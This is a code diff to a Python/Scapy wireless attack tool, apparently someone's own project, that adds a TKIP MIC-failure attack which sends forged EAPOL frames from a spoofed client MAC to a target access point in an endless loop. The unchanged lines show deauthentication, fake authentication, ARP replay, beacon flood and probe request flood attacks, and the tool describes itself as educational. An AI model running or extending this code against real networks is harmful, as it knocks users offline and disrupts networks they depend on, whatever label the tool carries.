@@ -9,14 +9,13 @@ from scapy.all import *
 from scapy.layers.dot11 import *
 from scapy.layers.l2 import ARP, Ether
 
-# Colors for terminal output
+# ================== Terminal Colors and Utilities ==================
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 CYAN = "\033[96m"
 RESET = "\033[0m"
 
-# Author print
 def print_author():
     print(f"{CYAN}[AUTOR]{RESET} Alfi Keita")
 
@@ -144,6 +143,7 @@ def deauth_attack(iface, ap_mac, client_mac=None, count=10):
         print_warn("Deauth attack interrupted by user")
     print_good(f"Deauth attack finished, total packets sent: {sent}")
 
+# ================== FAKE AUTH ATTACK ==================
 def fake_auth_attack(iface, ap_mac, your_mac, count=10):
     check_interface(iface)
     print_info(f"Starting Fake Auth attack on AP {ap_mac} from {your_mac}, Interface: {iface}")
@@ -171,6 +171,7 @@ def fake_auth_attack(iface, ap_mac, your_mac, count=10):
         print_warn("Fake Auth attack interrupted by user")
     print_good(f"Fake Auth attack finished, total packets sent: {sent}")
 
+# ================== ARP REPLAY ATTACK ==================
 def arp_replay_attack(iface, ap_mac, your_mac, pcap_file):
     check_interface(iface)
     print_info(f"Starting ARP Replay attack with packet from '{pcap_file}' on interface {iface}, AP: {ap_mac}, Your MAC: {your_mac}")
@@ -210,6 +211,7 @@ def arp_replay_attack(iface, ap_mac, your_mac, pcap_file):
     except KeyboardInterrupt:
         print_warn("ARP Replay attack interrupted by user")
 
+# ================== BEACON FLOOD ==================
 def beacon_flood(iface, ssid_file):
     check_interface(iface)
     print_info(f"Starting Beacon Flood on interface {iface} using SSIDs from {ssid_file}")
@@ -256,6 +258,7 @@ def beacon_flood(iface, ssid_file):
         print_warn("Beacon flood interrupted by user")
     print_good(f"Beacon flood finished, total packets sent: {sent}")
 
+# ================== PROBE REQUEST FLOOD ==================
 def probe_request_flood(iface):
     check_interface(iface)
     print_info(f"Starting Probe Request Flood on interface {iface}")
@@ -287,9 +290,48 @@ def probe_request_flood(iface):
         print_warn("Probe Request flood interrupted by user")
     print_good(f"Probe Request flood finished, total packets sent: {sent}")
 
+# ================== TKIP MIC FAILURE (from tkip.py) ==================
+def random_mac_tkip():
+    return "02:%02x:%02x:%02x:%02x:%02x" % (
+        random.randint(0x00, 0x7f),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+    )
+
+def send_mic_failure(iface, bssid, delay, client_mac=None):
+    print(f"[+] Spouštím MIC Failure útok na BSSID {bssid} skrz {iface}")
+    if not client_mac:
+        client_mac = random_mac_tkip()
+    print(f"[+] Používám klientskou MAC adresu {client_mac}")
+
+    dot11 = Dot11(
+        type=2,
+        subtype=0,
+        addr1=bssid,      # Access Point
+        addr2=client_mac,  # Fake client
+        addr3=bssid
+    )
+
+    # Statický payload jako v originále (můžeš zlepšit replay counter)
+    payload = bytes.fromhex(
+        "888e"          # EAPOL Ethertype
+        "0203005f0103005a"  # TKIP handshake frame header (nesprávný MIC)
+        "00000000000000000000000000000000"  # Replay counter a další hlavičky
+        + "00" * 90       # padding
+    )
+
+    frame = RadioTap() / dot11 / LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / SNAP(OUI=0x000000, code=0x888e) / Raw(load=payload)
+
+    while True:
+        sendp(frame, iface=iface, verbose=0)
+        print(f"[*] MIC Failure rámec odeslán na {bssid}")
+        time.sleep(delay)
+
+# ================== Argument Parsing and Main ==================
 def parse_args():
     parser = argparse.ArgumentParser(description="Advanced WiFi attacks tool for educational use (Linux only)")
-
     parser.add_argument("--deauth", action='store_true', help="Perform Deauth attack")
     parser.add_argument("-n", type=int, default=10, help="Number of packets to send (-1 for infinite)")
     parser.add_argument("-a", metavar="AP_MAC", help="MAC address of target AP")
@@ -302,6 +344,9 @@ def parse_args():
     parser.add_argument("--beacon", action='store_true', help="Perform Beacon Flood attack")
     parser.add_argument("-f", metavar="SSID_FILE", help="File containing list of SSIDs for beacon flood")
     parser.add_argument("--probe", action='store_true', help="Perform Probe Request Flood attack")
+    parser.add_argument("--tkip", action="store_true", help="Spustí TKIP MIC Failure exploit")
+    parser.add_argument("--delay", type=float, default=1.0, help="Zpoždění mezi rámci (s) [for --tkip]")
+    parser.add_argument("--client-mac", help="Klientská MAC adresa (fake) [for --tkip]")
     parser.add_argument("interface", help="Wireless interface in monitor mode")
 
     try:
@@ -322,8 +367,11 @@ def parse_args():
     if args.beacon:
         if not args.f:
             parser.error("Beacon flood requires -f <SSID file>")
-    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe):
-        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe)")
+    if args.tkip:
+        if not args.a:
+            parser.error("TKIP attack requires -a <BSSID>")
+    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe or args.tkip):
+        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe, --tkip)")
 
     return args
 
@@ -343,6 +391,11 @@ def main():
             beacon_flood(args.interface, args.f)
         elif args.probe:
             probe_request_flood(args.interface)
+        elif args.tkip:
+            try:
+                send_mic_failure(args.interface, args.a.lower(), args.delay, args.client_mac)
+            except KeyboardInterrupt:
+                print("\n[!] Ukončeno uživatelem.")
         else:
             print_error("No valid attack selected")
     except Exception as e:
